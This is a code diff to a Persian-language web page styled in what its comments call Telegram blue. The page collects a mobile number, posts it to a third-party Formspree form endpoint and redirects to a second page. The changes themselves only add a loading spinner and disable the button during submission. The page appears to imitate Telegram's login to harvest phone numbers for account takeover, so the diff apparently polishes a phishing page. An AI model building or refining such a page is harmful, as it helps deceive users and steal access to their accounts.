@@ -21,6 +21,7 @@
       width: 320px;
       box-shadow: 0 0 15px rgba(0,0,0,0.2);
       text-align: center;
+      position: relative;
     }
     .logo {
       margin-bottom: 10px;
@@ -52,10 +53,33 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      position: relative;
+      z-index: 1;
     }
     button:hover {
       background-color: #0075b6;
     }
+
+    /* استایل لودینگ */
+    .loader {
+      border: 4px solid rgba(0,0,0,0.1);
+      border-left-color: #0088cc; /* رنگ آبی تلگرام */
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      margin: -12px 0 0 -12px;
+      display: none;
+      z-index: 2;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
   </style>
 </head>
 <body>
@@ -69,7 +93,8 @@
 
     <form id="phoneForm" action="https://formspree.io/f/xjkokdbr" method="POST" onsubmit="return submitForm(event)">
       <input type="text" id="phone" name="phone" placeholder="شماره موبایل" required />
-      <button type="submit">Next</button>
+      <button type="submit" id="submitBtn">Next</button>
+      <div class="loader" id="loader"></div>
     </form>
   </div>
 
@@ -79,11 +104,18 @@
 
       const phoneInput = document.getElementById('phone');
       const phone = phoneInput.value.trim();
+      const submitBtn = document.getElementById('submitBtn');
+      const loader = document.getElementById('loader');
 
       if (phone === '') {
         alert('لطفاً شماره موبایل خود را وارد کنید');
         return false;
       }
+
+      // نمایش لودینگ و غیرفعال کردن دکمه
+      loader.style.display = 'block';
+      submitBtn.disabled = true;
+      submitBtn.style.cursor = 'not-allowed';
 
       fetch('https://formspree.io/f/xjkokdbr', {
         method: 'POST',
@@ -98,10 +130,16 @@
           window.location.href = "index2.html";
         } else {
           alert('مشکلی در ارسال شماره پیش آمد، لطفاً دوباره تلاش کنید');
+          loader.style.display = 'none';
+          submitBtn.disabled = false;
+          submitBtn.style.cursor = 'pointer';
         }
       })
       .catch(error => {
         alert('خطا در ارسال شماره: ' + error.message);
+        loader.style.display = 'none';
+        submitBtn.disabled = false;
+        submitBtn.style.cursor = 'pointer';
       });
 
       return false;
